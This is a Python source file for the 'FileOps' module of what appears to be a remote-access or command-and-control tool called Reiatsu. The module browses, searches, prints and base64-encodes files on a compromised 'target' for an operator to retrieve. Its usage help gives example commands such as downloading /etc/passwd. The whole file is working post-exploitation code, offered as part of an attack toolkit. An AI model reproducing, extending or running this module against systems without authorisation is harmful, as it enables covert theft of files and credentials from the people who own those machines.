"""
Reiatsu File Operations Module - Upload, download, and browse files.
"""
import os
import io
import sys
import base64
import platform
import stat
from datetime import datetime

class FileOps:
    """File Operations: Download, list, and manage files on target."""
    
    @staticmethod
    def _format_size(size):
        """Format file size in human-readable format."""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f}{unit}"
            size /= 1024
        return f"{size:.1f}TB"
    
    @staticmethod
    def _get_file_info(filepath):
        """Get detailed file information."""
        try:
            stat_info = os.stat(filepath)
            return {
                'size': stat_info.st_size,
                'modified': datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                'permissions': oct(stat_info.st_mode)[-3:],
                'is_dir': os.path.isdir(filepath)
            }
        except:
            return None
    
    @staticmethod
    def _download_file(filepath):
        """Download a file from target (returns base64 encoded content)."""
        output = ""
        if not os.path.exists(filepath):
            return f"[-] File not found: {filepath}"
        
        if os.path.isdir(filepath):
            return f"[-] Cannot download directory: {filepath}"
        
        try:
            file_info = FileOps._get_file_info(filepath)
            if file_info and file_info['size'] > 10 * 1024 * 1024:  # 10MB limit
                return f"[-] File too large ({FileOps._format_size(file_info['size'])}). Max 10MB."
            
            with open(filepath, 'rb') as f:
                content = f.read()
            
            encoded = base64.b64encode(content).decode()
            output += f"[+] File: {filepath}\n"
            output += f"[+] Size: {FileOps._format_size(len(content))}\n"
            output += f"[+] MD5:  {__import__('hashlib').md5(content).hexdigest()}\n"
            output += f"[+] Encoding: base64\n"
            output += f"[+] Content:\n{encoded}\n"
            output += f"\n[*] Decode: echo '<base64>' | base64 -d > filename"
        except PermissionError:
            output = f"[-] Permission denied: {filepath}"
        except Exception as e:
            output = f"[-] Error reading file: {e}"
        
        return output
    
    @staticmethod
    def _list_directory(dirpath):
        """List directory contents with details."""
        output = ""
        if not os.path.exists(dirpath):
            return f"[-] Path not found: {dirpath}"
        
        if not os.path.isdir(dirpath):
            return f"[-] Not a directory: {dirpath}"
        
        try:
            items = os.listdir(dirpath)
            output += f"[+] Directory: {dirpath}\n"
            output += f"[+] Items: {len(items)}\n\n"
            output += f"{'Type':<6} {'Size':<10} {'Modified':<20} {'Name'}\n"
            output += "-" * 70 + "\n"
            
            # Sort: directories first, then files
            dirs = []
            files = []
            
            for item in items:
                full_path = os.path.join(dirpath, item)
                info = FileOps._get_file_info(full_path)
                if info:
                    if info['is_dir']:
                        dirs.append((item, info))
                    else:
                        files.append((item, info))
            
            for item, info in sorted(dirs):
                output += f"{'[DIR]':<6} {'-':<10} {info['modified']:<20} {item}/\n"
            
            for item, info in sorted(files):
                size_str = FileOps._format_size(info['size'])
                output += f"{'[FILE]':<6} {size_str:<10} {info['modified']:<20} {item}\n"
                
        except PermissionError:
            output = f"[-] Permission denied: {dirpath}"
        except Exception as e:
            output = f"[-] Error listing directory: {e}"
        
        return output
    
    @staticmethod
    def _search_files(dirpath, pattern):
        """Search for files matching pattern."""
        output = ""
        matches = []
        
        try:
            import fnmatch
            for root, dirs, files in os.walk(dirpath):
                for filename in files:
                    if fnmatch.fnmatch(filename.lower(), pattern.lower()):
                        full_path = os.path.join(root, filename)
                        info = FileOps._get_file_info(full_path)
                        if info:
                            matches.append((full_path, info))
                
                # Limit search depth and results
                if len(matches) > 100:
                    break
            
            output += f"[+] Search: '{pattern}' in {dirpath}\n"
            output += f"[+] Found: {len(matches)} files\n\n"
            
            for filepath, info in matches[:50]:
                size_str = FileOps._format_size(info['size'])
                output += f"  {size_str:<10} {filepath}\n"
            
            if len(matches) > 50:
                output += f"\n[!] Showing first 50 of {len(matches)} results."
                
        except Exception as e:
            output = f"[-] Search failed: {e}"
        
        return output
    
    @staticmethod
    def _cat_file(filepath, lines=50):
        """Display text file contents."""
        output = ""
        if not os.path.exists(filepath):
            return f"[-] File not found: {filepath}"
        
        try:
            with open(filepath, 'r', errors='ignore') as f:
                content = f.readlines()
            
            output += f"[+] File: {filepath}\n"
            output += f"[+] Lines: {len(content)} (showing first {min(lines, len(content))})\n"
            output += "-" * 50 + "\n"
            
            for i, line in enumerate(content[:lines]):
                output += line
            
            if len(content) > lines:
                output += f"\n[...truncated {len(content) - lines} lines...]"
                
        except Exception as e:
            output = f"[-] Error reading file: {e}"
        
        return output

    @staticmethod
    def run_remote(args):
        """Main entry point for file operations module."""
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            args_list = args.split() if args else []
            
            if len(args_list) < 1:
                print("[!] File Operations Module")
                print("\nUsage:")
                print("  module <id> fileops download <filepath>  - Download file (base64)")
                print("  module <id> fileops list <dirpath>       - List directory")
                print("  module <id> fileops search <dir> <pat>   - Search files")
                print("  module <id> fileops cat <filepath>       - View text file")
                print("  module <id> fileops pwd                  - Current directory")
                print("\nExamples:")
                print("  module abc fileops list /etc")
                print("  module abc fileops download /etc/passwd")
                print("  module abc fileops search /home *.txt")
                print("  module abc fileops cat /var/log/syslog")
            else:
                action = args_list[0].lower()
                
                if action == "pwd":
                    print(f"[+] Current Directory: {os.getcwd()}")
                    print(f"[+] Home Directory: {os.path.expanduser('~')}")
                    
                elif action == "download" and len(args_list) >= 2:
                    filepath = ' '.join(args_list[1:])
                    print(FileOps._download_file(filepath))
                    
                elif action == "list" and len(args_list) >= 2:
                    dirpath = ' '.join(args_list[1:])
                    print(FileOps._list_directory(dirpath))
                    
                elif action == "search" and len(args_list) >= 3:
                    dirpath = args_list[1]
                    pattern = args_list[2]
                    print(FileOps._search_files(dirpath, pattern))
                    
                elif action == "cat" and len(args_list) >= 2:
                    filepath = ' '.join(args_list[1:])
                    print(FileOps._cat_file(filepath))
                    
                else:
                    print(f"[-] Unknown action or missing arguments: {action}")
                    print("[*] Run 'module <id> fileops' for help.")
                    
        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()
